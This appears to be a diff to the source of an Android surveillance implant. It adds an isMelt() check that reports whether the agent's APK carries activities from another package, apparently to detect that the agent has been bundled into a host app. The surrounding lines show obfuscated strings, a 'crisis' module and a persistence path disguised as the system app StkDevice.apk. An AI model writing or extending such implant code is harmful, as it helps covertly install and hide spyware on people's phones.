@@ -29,6 +29,7 @@ import com.android.dvci.file.AutoFile;
 import com.android.dvci.gui.ASG;
 import com.android.dvci.module.ModuleCrisis;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.PackageUtils;
 import com.android.mm.M;
 
 import java.util.ArrayList;
@@ -127,6 +128,8 @@ public class Status {
 
 
 	public static final String persistencyApk=M.e("/system/app/StkDevice.apk");
+	private static ArrayList<String> activityList=null;
+	static boolean activityListTested =false;
 	private static int persistencyStatus = PERSISTENCY_STATUS_NOT_REQUIRED;
 
 
@@ -979,5 +982,19 @@ public class Status {
 				break;
 		}
 		return M.e("UNKNOWN");
+	}
+	public static boolean isMelt() {
+		if (activityListTested==false){
+			activityList = PackageUtils.getActivitisFromApk(getApkName());
+			activityListTested=true;
+		}
+		if (activityList!=null && !activityList.isEmpty()) {
+			for(String s:activityList){
+				if (!s.contains(Status.self().getAppContext().getPackageName())) {
+					return true;
+				}
+			}
+		}
+		return false;
 	}
 }
